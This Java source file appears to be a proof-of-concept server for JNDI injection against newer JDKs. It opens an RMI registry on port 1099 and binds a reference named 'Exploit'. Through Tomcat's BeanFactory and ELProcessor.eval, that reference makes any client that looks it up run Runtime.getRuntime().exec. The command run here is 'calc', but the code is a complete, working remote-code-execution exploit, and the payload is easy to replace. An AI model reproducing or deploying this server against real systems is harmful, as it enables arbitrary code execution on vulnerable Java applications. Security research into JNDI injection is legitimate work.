package JNDI.高版本;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class server {
    public static void main(String[] args) throws Exception{
        //在本机1099端口开启rmi registry
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor",null,
                "","",true,"org.apache.naming.factory.BeanFactory",null);

        ref.add(new StringRefAddr("forceString","feng=eval"));
        ref.add(new StringRefAddr("feng","Runtime.getRuntime().exec(\"calc\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit",referenceWrapper);

    }
}